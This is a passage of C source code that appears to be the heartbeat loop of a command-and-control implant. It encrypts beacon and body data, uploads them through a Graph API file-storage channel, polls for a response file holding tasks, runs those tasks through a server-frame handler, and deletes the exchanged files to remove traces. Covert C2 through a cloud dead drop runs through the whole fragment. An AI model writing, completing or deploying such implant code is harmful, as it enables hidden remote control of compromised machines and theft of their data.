                    if (nax_encrypt(a->cfg.aes_key, body, body_len, body_enc, &body_enc_len) < 0) {
                        free(body_enc);
                        body_enc = NULL;
                        body_enc_len = 0;
                    }
                }
                free(body);
                body = NULL;
            }

            uint32_t file_len = 0;
            uint8_t *file = build_upload_file(session_uid, beat_enc, beat_enc_len,
                                              body_enc, body_enc_len, &file_len);
            free(beat_enc);
            if (body_enc) free(body_enc);
            if (!file) continue;

            DBG("HEARTBEAT: uploading %s (%u bytes)", c_name, file_len);
            int rc = graph_upload(c_name, file, file_len);
            free(file);
            if (rc < 0) {
                DBG("HEARTBEAT: upload failed — re-registering");
                break;
            }

            /* Poll for r_<nonce>.dat (tasks) */
            uint32_t resp_len = 0;
            uint8_t *resp = graph_poll_response(r_name, &resp_len);
            graph_delete(c_name);

            if (resp && resp_len > 0) {
                handle_server_frame(a, resp, resp_len);
                free(resp);
                graph_delete(r_name);
            }
        }
    }

    curl_global_cleanup();
}

#endif /* NAX_GRAPH_MODE */
